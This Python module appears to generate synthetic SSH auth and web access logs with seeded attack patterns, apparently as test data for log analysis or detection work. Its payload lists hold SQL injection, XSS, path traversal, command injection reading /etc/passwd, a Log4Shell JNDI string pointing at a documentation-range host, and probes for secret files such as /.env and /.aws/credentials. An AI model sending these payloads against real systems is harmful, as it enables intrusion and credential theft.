"""Seeded generator for realistic-looking auth.log and access.log files with injected attacks.

All attacker addresses come from the RFC 5737 documentation ranges (192.0.2.0/24, 198.51.100.0/24,
203.0.113.0/24) so the sample data never points at a real host.
"""

from __future__ import annotations

import random
from datetime import datetime, timedelta

USERS = ["hasaan", "aisha", "deploy", "ci-runner", "tom"]
HOME_IPS = {"hasaan": "10.20.0.11", "aisha": "10.20.0.12", "tom": "10.20.0.15"}
PAGES = ["/", "/about", "/blog", "/blog/diffusion-from-scratch", "/blog/vibe-coding", "/projects", "/contact",
         "/static/app.css", "/static/app.js", "/static/logo.svg", "/api/health", "/api/projects", "/favicon.ico"]
BROWSERS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
            "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0"]
PROBE_PATHS = ["/.env", "/.git/config", "/wp-login.php", "/wp-admin/", "/phpmyadmin/", "/admin", "/backup.zip",
               "/config.php.bak", "/server-status", "/.aws/credentials", "/actuator/env", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
               "/cgi-bin/luci", "/HNAP1/", "/boaform/admin/formLogin", "/.DS_Store", "/api/v1/users", "/console", "/solr/admin/info/system",
               "/owa/auth/logon.aspx", "/remote/login", "/xmlrpc.php", "/.svn/entries", "/db.sql", "/old/", "/test.php"]
INJECTIONS = ["/projects?id=1'%20OR%20'1'='1", "/search?q=%3Cscript%3Ealert(1)%3C/script%3E", "/static/../../../../etc/passwd",
              "/api/projects?sort=name;cat%20/etc/passwd", "/blog?page=1%20UNION%20SELECT%20username,password%20FROM%20users--",
              "/contact?next=${jndi:ldap://203.0.113.9/a}", "/download?file=....//....//etc/shadow"]


def _syslog(ts: datetime, host: str, proc: str, pid: int, msg: str) -> str:
    return f"{ts.strftime('%b')} {ts.day:2d} {ts.strftime('%H:%M:%S')} {host} {proc}[{pid}]: {msg}"


def _access(ip: str, ts: datetime, method: str, path: str, status: int, size: int, ua: str, ref: str = "-") -> str:
    return f'{ip} - - [{ts.strftime("%d/%b/%Y:%H:%M:%S")} +0000] "{method} {path} HTTP/1.1" {status} {size} "{ref}" "{ua}"'


def generate_auth_log(start: datetime | None = None, hours: int = 24, seed: int = 42) -> list[str]:
    rng = random.Random(seed)
    start = start or datetime(2026, 9, 28, 0, 0, 0)
    host = "web-01"
    out: list[tuple[datetime, str]] = []

    def add(ts, msg, proc="sshd"):
        out.append((ts, _syslog(ts, host, proc, rng.randint(1000, 65000), msg)))

    # --- normal activity: staff logging in during working hours, the CI runner every hour, a few typos
    for h in range(hours):
        t = start + timedelta(hours=h)
        add(t + timedelta(minutes=rng.randint(0, 5)), f"Accepted publickey for ci-runner from 10.20.0.21 port {rng.randint(30000, 60000)} ssh2")
        if 8 <= t.hour <= 18:
            for _ in range(rng.randint(1, 3)):
                user = rng.choice(["hasaan", "aisha", "tom"])
                ip = HOME_IPS[user] if rng.random() < 0.9 else "192.168.50.7"  # usual desk, occasionally the VPN
                ts = t + timedelta(minutes=rng.randint(0, 59), seconds=rng.randint(0, 59))
                if rng.random() < 0.15:  # fat-fingered password
                    add(ts - timedelta(seconds=20), f"Failed password for {user} from {ip} port {rng.randint(30000, 60000)} ssh2")
                add(ts, f"Accepted publickey for {user} from {ip} port {rng.randint(30000, 60000)} ssh2")
                if rng.random() < 0.3:
                    add(ts + timedelta(minutes=3), f"{user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx", "sudo")
        # background internet noise: a couple of random invalid users every hour
        for _ in range(rng.randint(0, 2)):
            ip = f"198.51.100.{rng.randint(1, 254)}"
            ts = t + timedelta(minutes=rng.randint(0, 59))
            u = rng.choice(["admin", "test", "oracle", "ubuntu", "pi"])
            add(ts, f"Invalid user {u} from {ip} port {rng.randint(30000, 60000)}")
            add(ts + timedelta(seconds=2), f"Failed password for invalid user {u} from {ip} port {rng.randint(30000, 60000)} ssh2")

    # --- attack 1: brute force from 203.0.113.45 at 02:10 that eventually succeeds as "deploy"
    t = start + timedelta(hours=2, minutes=10)
    for _ in range(180):
        u = rng.choice(["root", "admin", "deploy", "ubuntu", "git", "postgres"])
        prefix = "" if u in USERS else "invalid user "
        if prefix:
            add(t, f"Invalid user {u} from 203.0.113.45 port {rng.randint(30000, 60000)}")
        add(t + timedelta(seconds=1), f"Failed password for {prefix}{u} from 203.0.113.45 port {rng.randint(30000, 60000)} ssh2")
        t += timedelta(seconds=rng.uniform(1.5, 4))
    add(t + timedelta(seconds=5), f"Accepted password for deploy from 203.0.113.45 port {rng.randint(30000, 60000)} ssh2")
    add(t + timedelta(minutes=2), "deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/cat /etc/shadow", "sudo")

    # --- attack 2: password spray, one attempt per username from 203.0.113.80 at 14:30
    t = start + timedelta(hours=14, minutes=30)
    for u in ["hasaan", "aisha", "tom", "deploy", "admin", "support", "info", "sales", "marketing", "dev", "backup", "web"]:
        prefix = "" if u in USERS else "invalid user "
        add(t, f"Failed password for {prefix}{u} from 203.0.113.80 port {rng.randint(30000, 60000)} ssh2")
        t += timedelta(seconds=rng.uniform(20, 50))

    # --- anomaly 3: a real user, but from a never-seen IP at 03:47
    add(start + timedelta(hours=3, minutes=47), f"Accepted password for aisha from 192.0.2.200 port {rng.randint(30000, 60000)} ssh2")

    out.sort(key=lambda x: x[0])
    return [line for _, line in out]


def generate_access_log(start: datetime | None = None, hours: int = 24, seed: int = 7) -> list[str]:
    rng = random.Random(seed)
    start = start or datetime(2026, 9, 28, 0, 0, 0)
    out: list[tuple[datetime, str]] = []
    # visitor ranges deliberately don't overlap the attacker addresses used below
    visitors = [rng.choice([f"192.0.2.{rng.randint(1, 140)}", f"198.51.100.{rng.randint(100, 254)}"]) for _ in range(80)]

    for h in range(hours):
        t = start + timedelta(hours=h)
        busy = 1.0 + 1.5 * (9 <= t.hour <= 22)
        for _ in range(int(rng.randint(8, 14) * busy)):  # browsing sessions
            ip, ua = rng.choice(visitors), rng.choice(BROWSERS)
            ts = t + timedelta(minutes=rng.randint(0, 59), seconds=rng.randint(0, 59))
            for _ in range(rng.randint(1, 6)):
                path = rng.choice(PAGES)
                status = 200 if rng.random() > 0.03 else rng.choice([304, 404])
                size = rng.randint(400, 40000) if not path.startswith("/static") else rng.randint(2000, 90000)
                out.append((ts, _access(ip, ts, "GET", path, status, size, ua)))
                ts += timedelta(seconds=rng.uniform(1, 25))
        if rng.random() < 0.4:  # uptime monitor
            ts = t + timedelta(minutes=rng.randint(0, 59))
            out.append((ts, _access("10.20.0.30", ts, "GET", "/api/health", 200, 17, "UptimeMonitor/2.1")))

    # --- attack: directory/vulnerability scanner at 05:20
    t = start + timedelta(hours=5, minutes=20)
    for _ in range(3):
        for p in PROBE_PATHS:
            status = 404 if p not in ("/admin", "/xmlrpc.php") else 403
            out.append((t, _access("198.51.100.23", t, rng.choice(["GET", "GET", "HEAD"]), p, status, rng.randint(150, 600),
                                   "Mozilla/5.0 zgrab/0.x")))
            t += timedelta(seconds=rng.uniform(0.2, 1.2))

    # --- attack: injection attempts at 11:05
    t = start + timedelta(hours=11, minutes=5)
    for p in INJECTIONS * 2:
        out.append((t, _access("203.0.113.77", t, "GET", p, rng.choice([400, 403, 500]), rng.randint(200, 900), "sqlmap/1.8#stable")))
        t += timedelta(seconds=rng.uniform(1, 4))

    # --- anomaly: bulk download (possible scraping/exfil) at 23:10
    t = start + timedelta(hours=23, minutes=10)
    for i in range(60):
        out.append((t, _access("192.0.2.150", t, "GET", f"/api/projects?page={i}", 200, rng.randint(800_000, 2_000_000),
                               "python-requests/2.32")))
        t += timedelta(seconds=rng.uniform(0.5, 2))

    out.sort(key=lambda x: x[0])
    return [line for _, line in out]
